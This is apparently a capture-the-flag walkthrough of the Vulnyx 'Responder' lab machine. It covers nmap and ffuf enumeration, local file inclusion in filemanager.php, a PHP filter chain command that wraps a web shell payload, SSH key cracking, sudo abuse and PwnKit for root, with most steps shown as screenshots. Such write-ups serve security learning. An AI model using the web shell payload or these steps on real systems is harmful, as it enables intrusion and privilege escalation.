## First Enumeration with nmap

```shell
# Nmap 7.94SVN scan initiated Sun Apr 14 01:37:38 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 22,80 -Pn 172.16.246.130
Nmap scan report for 172.16.246.130
Host is up (0.00021s latency).

PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 14 01:37:46 2024 -- 1 IP address (1 host up) scanned in 8.09 seconds
```
we have only one port open. 


## Enumerating the web app 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/da0a7624-0fb4-4b77-b379-ac112d683e43)

opening the ip on a browser, we got a weird info sayin `your ansswer is your answer`.

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnyx/Responder]
└─$ ffuf -u 'http://172.16.246.130/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -ic -e .php,.bak,.txt,.sql,.env,.sh,.phtml,.zip

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.16.246.130/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Extensions       : .php .bak .txt .sql .env .sh .phtml .zip 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 31, Words: 6, Lines: 2, Duration: 2ms]
.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 201ms]
.phtml                  [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 206ms]
                        [Status: 200, Size: 31, Words: 6, Lines: 2, Duration: 5ms]
.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 5ms]
.phtml                  [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 5ms]
filemanager.php         [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 54ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 7ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

fuzzing for hidden dirs , we got a `filemanager.php`. Opening it on a browser, got redirected to the home page. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnyx/Responder]
└─$ ffuf -ic -u "http://responder/filemanager.php?FUZZ=/etc/hosts" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -fs 0 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://responder/filemanager.php?FUZZ=/etc/hosts
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

random                  [Status: 302, Size: 183, Words: 19, Lines: 8, Duration: 9ms]
:: Progress: [87651/87651] :: Job [1/1] :: 2679 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
```
the param `filemanager.php` looks like a potential `LFI` endpoint. so fuzzing, we got the parameter. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/26ab9065-7b65-44dd-a010-105d3bbd3895)

using burpsuite to intercept request, we can see there's an LFI vulnerability present let's exploit the LFI to RCE

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d4838b94-e6d8-460a-94ce-47112194ed6e)

There's a tool i use in exploiting LFI, it's a php chain generator to trigger RCE. [link](https://github.com/synacktiv/php_filter_chain_generator).

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/0161d13c-5b00-41c0-8f95-663ed966a79e)

try to trigger a phpinfo. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/71e450bf-74f2-4832-b311-a404f2e123c2)

we trigger it success, let's try out RCE.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/10f656eb-a20f-4205-9be9-9ced4993314a)

```shell
 python3 php_filter_chain_generator.py --chain '<?php system($_GET['cmd']); ?>'
```
using the command sytanx to create an RCE payload 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7775fb90-0def-42e5-96bc-88ed846850bc)

we trigger RCE!!!, let's spawn a reverse shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/de43109a-c82f-4eb2-a585-55822dd9cac8)

we got a reverse shell!!!


## Privilege Escalation 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/cf628938-36d2-4dca-ba70-64ff480584cf)

the web root dir, `filemanager.php` contains id_rsa key. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e660318a-840f-4871-b307-58f192422b02)

using `ssh2john` to cinvert to hash and crack it using hhashcat, we got the password `elliott`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ade722fa-495d-435f-9719-6d7bf5faa704)

login using the key and the passphrase of the id_rsa key.

```shell
elliot@responder:~$ sudo -l
Matching Defaults entries for elliot on responder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User elliot may run the following commands on responder:
    (rohit) NOPASSWD: /usr/bin/calc
elliot@responder:~$ 
```
checking sudo permissions, we can see we can run `calc` as user rohit without password. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/25ebc95d-a59a-401d-b38c-2a86106e20d3)

Abusing the binary `calc` gave us shell as user `rohit`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c19d7cce-62df-4af1-8871-a83f44ad6481)

After many research, trying to exploit it, decided to try out `PwnKit` [PwnKit](https://github.com/ly4k/PwnKit).

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5ed7c996-da74-47aa-a830-44baedda24c0)

Followed the instruction from github and Boom!!! we rooted it!!!. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1621110a-1070-4660-ac48-fd698de62165)

And we are through!!! 🙂
